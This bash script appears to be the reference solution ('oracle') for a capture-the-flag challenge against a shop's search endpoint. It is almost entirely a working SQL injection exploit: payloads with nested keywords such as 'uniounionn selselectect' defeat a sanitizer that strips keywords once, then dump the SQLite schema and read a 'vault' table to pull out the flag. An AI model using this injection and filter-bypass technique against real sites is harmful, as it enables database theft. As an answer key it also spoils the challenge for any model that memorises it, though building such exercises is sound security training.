#!/usr/bin/env bash
# Oracle: schema via resurrected UNION (strip-sanitizer), then vault dump.
set -euo pipefail
B=http://shop:8080
enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }
S1="%' uniounionn selselectect 1, sql, 3, 4 frfromom sqlite_master--"
curl -s "$B/search?s=$(enc "$S1")" | sed 's/<[^>]*>//g' | grep -i table
S2="%' uniounionn selselectect 1, cell, 3, 4 frfromom vault--"
curl -s "$B/search?s=$(enc "$S2")" | sed 's/<[^>]*>//g' | grep -o 'flag{[^}]*}'
